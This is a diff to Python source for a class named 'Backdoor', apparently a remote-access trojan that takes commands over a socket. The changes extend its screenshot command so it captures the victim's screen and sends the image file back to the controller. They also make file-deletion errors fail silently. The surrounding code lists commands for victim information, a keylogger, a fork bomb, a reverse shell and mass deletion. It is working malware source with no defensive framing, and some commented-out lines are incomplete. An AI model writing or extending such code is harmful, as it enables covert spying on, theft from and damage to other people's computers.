@@ -95,7 +95,7 @@ class Backdoor:
 
         while True:
             try:
-                message_command = self.sock.recv(1024)
+                message_command = self.sock.recv(2048)
                 message_command_descrypt = message_command.decode()
 
                 if message_command_descrypt == "exit":
@@ -104,7 +104,7 @@ class Backdoor:
                     sys.exit()
                     
                 try:
-                    not_in = ["get_ip","victims_info","remove_all","keylogger_start","forkbomb","reverse_tcp","download"]
+                    not_in = ["get_ip","victims_info","remove_all","keylogger_start","forkbomb","reverse_tcp","download","screenshot"]
 
                     # Get machine's IP adress
 
@@ -173,12 +173,23 @@ class Backdoor:
                         self.sock.send("Reverse Shell Session established with sucess!".encode())
 
                     
-                    # Screenshot
+                    # Sending Screenshot
 
                     if message_command_descrypt == "screenshot":
                         screenshot = pyautogui.screenshot()
                         screenshot.save("screenshot.png")
-                        self.sock.send("Screenshot done!\n".encode())
+                    
+                        data_size = os.path.getsize("screenshot.png")
+                        self.sock.send(str(data_size).encode("utf-8"))
+
+                        with open("screenshot.png","rb") as sc:
+                            screenshot_data = sc.read()
+                            self.sock.send(screenshot_data)
+                            #data_str = b""
+                                #while data_str < screenshot_data:
+                                    #data_str += 
+
+
 
                     # This is for crash the target's machine
 
@@ -245,9 +256,10 @@ class Backdoor:
                         self.rmfile = message_command_descrypt.split(" ")[1]
                         os.remove(self.rmfile)
                         self.sock.send("Removed file with sucess!".encode())
-                    except Exception as e:
-                        self.sock.send(str(e).encode())
-                    
+                    #except Exception as e:
+                        #self.sock.send(str(e).encode())
+                    except:
+                        continue
 
                 if message_command_descrypt == "rm":
                     self.sock.send("You must specify a file".encode())
